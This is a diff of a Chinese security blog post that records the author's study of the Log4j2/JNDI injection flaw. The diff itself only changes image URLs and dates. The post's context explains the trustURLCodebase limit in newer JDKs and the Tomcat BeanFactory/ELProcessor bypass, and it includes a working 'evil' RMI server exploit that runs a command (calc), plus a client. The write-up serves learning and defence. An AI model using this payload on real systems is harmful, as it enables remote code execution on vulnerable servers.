@@ -27,21 +27,21 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="lo4gj2漏洞简单学习记录log4j2和log4j简单的小区别   Log4j2分为2个jar包，一个是接口 log4j-api-版 本 号 . j a r   ， 一 个 是 具 体 实 现   l o g 4 j − c o r e − {版本号}.jar ，一个是具体实现 log4j-core-版本号.jar ，一个是具体实现 log4j−core−{版本号}.jar 。Log4j只有一个">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922172036555.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922174055442.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922180330569.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923135856558.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140033950.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140150754.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191015111.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191700911.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922165932132.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922172036555.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922174055442.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922180330569.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923135856558.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140033950.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140150754.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191015111.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191700911.png">
 <meta property="article:published_time" content="2022-09-23T06:15:14.000Z">
-<meta property="article:modified_time" content="2022-09-23T11:18:36.000Z">
+<meta property="article:modified_time" content="2024-09-28T14:07:42.779Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="log4j2">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png">
+<meta name="twitter:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922165932132.png">
 
 <link rel="canonical" href="http://example.com/2022/09/23/log4j2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
 
@@ -224,10 +224,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-09-23 14:15:14 / 修改时间：19:18:36" itemprop="dateCreated datePublished" datetime="2022-09-23T14:15:14+08:00">2022-09-23</time>
+              <time title="创建时间：2022-09-23 14:15:14" itemprop="dateCreated datePublished" datetime="2022-09-23T14:15:14+08:00">2022-09-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-28 22:07:42" itemprop="dateModified" datetime="2024-09-28T22:07:42+08:00">2024-09-28</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -317,11 +323,11 @@
 <p>LDAP的限制中不对<code>javaSerializedData</code>验证,所以可以打本地<code>gadget</code></p>
 <h3 id="具体代码执行的地方"><a href="#具体代码执行的地方" class="headerlink" title="具体代码执行的地方"></a>具体代码执行的地方</h3><p>在<code>NamingManager.getObjectFactoryFromReference()</code>方法中,如果在默认的classpath加载不到该类</p>
 <p>就会请求reference中的codebase得到class内容并使用类加载器加载,之后通过默认构造函数构造对象</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png" alt="image-20220922165932132"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922165932132.png" alt="image-20220922165932132"></p>
 <h4 id="什么是codebase"><a href="#什么是codebase" class="headerlink" title="什么是codebase"></a>什么是codebase</h4><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
 <h3 id="高版本为何无效"><a href="#高版本为何无效" class="headerlink" title="高版本为何无效"></a>高版本为何无效</h3><p>上述所有操作都必须在JDK8u191之前才可以实现</p>
 <p>在<code>VersionHelper12.loadClass</code>中加了一个对于trustURLCodebase的判断来控制是否允许请求codebase下载对应的class文件,其默认为false</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922172036555.png" alt="image-20220922172036555"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922172036555.png" alt="image-20220922172036555"></p>
 <p>可以手动开启trustURLCodebase</p>
 <p><code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>将其指定为true，</p>
 <h2 id="jdk高版本"><a href="#jdk高版本" class="headerlink" title="jdk高版本"></a>jdk高版本</h2><h3 id="lookup基本功能"><a href="#lookup基本功能" class="headerlink" title="lookup基本功能"></a>lookup基本功能</h3><p>当java底层请求ldap服务之后,ldap主要返回了三个参数javaClassName,javaFactory,javaFactoryLocation,以及一些额外参数,客户端获得这些参数之后主要做一件事情:构造需要的类实例,即客户端通过javaFactory类来构建实现我们需要的javaClassName执行的实例,这个过程中需要注意一下几点</p>
@@ -329,7 +335,7 @@
 <li><p>javaFactory类是ObjectFactory的子类</p>
 </li>
 <li><p>javaFactory有两个来源:来自codebase(ldap返回的codebase地址),或者来自本地(ldap返回对应javaFactory的类地址)</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922174055442.png" alt="image-20220922174055442"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922174055442.png" alt="image-20220922174055442"></p>
 <ul>
 <li><p>​    对于来自codeabse的Factory:和低版本中的逻辑一样,我们需要请求Codebase获取其class文件,然后加载该Factory类,并使用默认构造函数实例化出Factory实例</p>
 </li>
@@ -342,19 +348,19 @@
 <li><p>log4j2通过javaFactory得到对应的对象之后,会调用其toString方法将其转换为字符串,然后用该字符串替换日志中的${…}内容,并且打印出来</p>
 </li>
 </ul>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922180330569.png" alt="image-20220922180330569"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922180330569.png" alt="image-20220922180330569"></p>
 <h3 id="高版本如何利用ldap实现攻击"><a href="#高版本如何利用ldap实现攻击" class="headerlink" title="高版本如何利用ldap实现攻击"></a>高版本如何利用ldap实现攻击</h3><p>我们知道高版本已经无法通过codebase获取javaFactory的class文件,所以我们想通过让客户端加载和实例化我们构建的javaFactory来实现攻击是不可能的了</p>
 <p>但是还可以通过ldap实例化本地的javaFactory,并且用本地的javaFactory实例化一个本地存在的类所以现在的问题就是如何找到一个可以被利用的本地javaFactory类</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
 </blockquote>
 <p>参考文章中提到了tomcat携带的org.apache.naming.factory.BeanFactory类就是一个存在风险的ObjectFactory子类。通过该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。因为我们可以通过forceString来制定某个String变量的setter方法名称。</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923135856558.png" alt="image-20220923135856558"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923135856558.png" alt="image-20220923135856558"></p>
 <p>在红框中会强制替换setterName和对应的param名称</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140033950.png" alt="image-20220923140033950"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140033950.png" alt="image-20220923140033950"></p>
 <p>之后将param和param对应的setter方法放到map  <code>forced</code>中</p>
 <p>并在接下来的代码中进行调用</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140150754.png" alt="image-20220923140150754"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923140150754.png" alt="image-20220923140150754"></p>
 <p>基于此能力,我们就可利用<code>javax.el.ELProcessor</code>类,因为其有默认公开的无参构造方法,还有个eval方法,只有一个String入参,其可以执行EL表达式,从而执行任意指令</p>
 <blockquote>
 <p> 这里埋个伏笔,完事可以尝试使用codeql来查询是否存在这样的类</p>
@@ -363,9 +369,9 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        </span><br><span class="line"> <span class="comment">//这里el表达式是通过&quot;&quot;空字符串.getClass</span></span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>最后执行的el表达式长这样</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191015111.png" alt="image-20220923191015111"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191015111.png" alt="image-20220923191015111"></p>
 <p>通过””的string类型获取到String的class,所有class都继承于Class类,隐含这forName这个加载方法加载类</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191700911.png" alt="image-20220923191700911"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220923191700911.png" alt="image-20220923191700911"></p>
 <p>client</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url=<span class="string">&quot;rmi://127.0.0.1:1097/Object&quot;</span>;</span><br><span class="line">        Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
